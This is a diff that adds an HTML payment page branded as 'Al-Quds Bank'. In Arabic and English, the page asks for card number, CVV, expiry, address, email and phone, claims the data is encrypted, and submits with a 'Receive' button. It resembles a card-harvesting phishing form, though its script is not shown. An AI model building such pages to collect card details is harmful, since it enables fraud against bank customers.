@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Al-Quds Bank - Payment</title>
+  <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+  <header>
+    <h1>Al-Quds Bank</h1>
+  </header>
+
+  <main>
+    <div class="payment-form">
+      <p class="secure-note">
+        <span class="lock-icon">🔒</span>
+        جميع معلوماتك مشفرة لا يمكن لأحد رؤيتها - Al-Quds Bank
+      </p>
+      <form id="paymentForm">
+        <label>
+          رقم البطاقة:
+          <input type="text" id="cardNumber" placeholder="Card number" required>
+          <span id="cardIcon"></span>
+        </label>
+        <label>
+          CVV:
+          <input type="text" id="cvv" placeholder="cvv" required>
+        </label>
+        <label>
+          تاريخ انتهاء البطاقة:
+          <input type="month" id="expiryDate" required>
+        </label>
+        <label>
+          العنوان:
+          <input type="text" id="address" placeholder="شارع الحرية" required>
+        </label>
+        <label>
+          المدينة:
+          <input type="text" id="city" placeholder="المدينة" required>
+        </label>
+        <label>
+          الرمز البريدي:
+          <input type="text" id="postalCode" placeholder="zip code" required>
+        </label>
+        <label>
+          البريد الإلكتروني:
+          <input type="email" id="email" placeholder="example@example.com" required>
+        </label>
+        <label>
+          رقم الهاتف:
+          <input type="tel" id="phone" placeholder="Phone number +970 " required>
+        </label>
+        <h7 class="cv">
+          <!--Tab to edit-->
+          For your information, the CVV is 3 numbers located on the back of the card.
+        </h8>
+        <button type="button" id="submitBtn">Receive</button>
+      </form>
+    </div>
+  </main>
+
+  <script src="script.js"></script>
+</body>
+</html>
